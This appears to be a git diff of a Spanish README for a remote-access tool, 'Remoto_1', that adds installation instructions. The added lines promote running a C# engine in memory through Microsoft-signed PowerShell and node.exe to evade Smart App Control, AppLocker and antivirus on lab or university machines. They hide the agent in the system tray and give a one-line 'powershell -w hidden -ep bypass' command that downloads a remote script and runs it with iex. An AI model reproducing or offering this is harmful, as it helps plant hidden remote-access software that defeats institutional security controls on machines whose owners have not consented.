@@ -116,6 +116,10 @@ El proyecto incluye ahora **Modo Hub / API en la Nube** integrado directamente e
      3. Cuando el `.exe` se abre en un PC, genera su túnel HTTPS público (`https://xxxx.lhr.life`) y lo registra automáticamente en `/api/equipos` de tu Vercel para que aparezca en **"Equipos en Línea"** con un clic.
    - **Servidor en la Nube Activo (Render.com)**:
      - URL pública del proyecto: **`https://remoto-1.onrender.com`**
-     - Descarga del paquete limpio para laboratorios/universidad (sin bloqueos de antivirus ni AppLocker): **`https://remoto-1.onrender.com/Remoto_1.zip`** (extraer y ejecutar `iniciar_agente.bat`).
-     - Descarga directa del ejecutable: **`https://remoto-1.onrender.com/Remoto_1_Portable.exe`**
-     - Al iniciar cualquiera de los dos en Windows 10/11, el equipo aparece automáticamente en **"Equipos en Línea"** dentro de `https://remoto-1.onrender.com` sin necesidad de colocar ninguna dirección IP.
+     - Descarga del paquete limpio para laboratorios/universidad o Windows 11 con Control Inteligente de Aplicaciones (sin usar archivos `.exe` sin firmar): **`https://remoto-1.onrender.com/Remoto_1.zip`** (extraer y abrir `iniciar_agente.bat`).
+     - Ejecución del motor nativo C# 100% en memoria ([`motor_nativo.ps1`](file:///c:/Users/juanp/OneDrive/Documents/Proyectos_Juan/Remoto_1/motor_nativo.ps1)) y bandeja del sistema en **Iconos ocultos** ([`bandeja_sistema.ps1`](file:///c:/Users/juanp/OneDrive/Documents/Proyectos_Juan/Remoto_1/bandeja_sistema.ps1)) mediante binarios firmados oficialmente por Microsoft (`powershell.exe`) y OpenJS Foundation (`node.exe`), eliminando el error `spawn UNKNOWN` y los bloqueos de Smart App Control / AppLocker.
+     - Comando rápido (`Win + R`):
+       ```powershell
+       powershell -w hidden -ep bypass -c "irm https://remoto-1.onrender.com/instalar.ps1 | iex"
+       ```
+     - Al iniciar cualquiera de los métodos en Windows 10/11, el programa queda oculto en **Iconos ocultos** (sin ventana negra abierta) y el equipo aparece automáticamente en **"Equipos en Línea"** dentro de `https://remoto-1.onrender.com`.
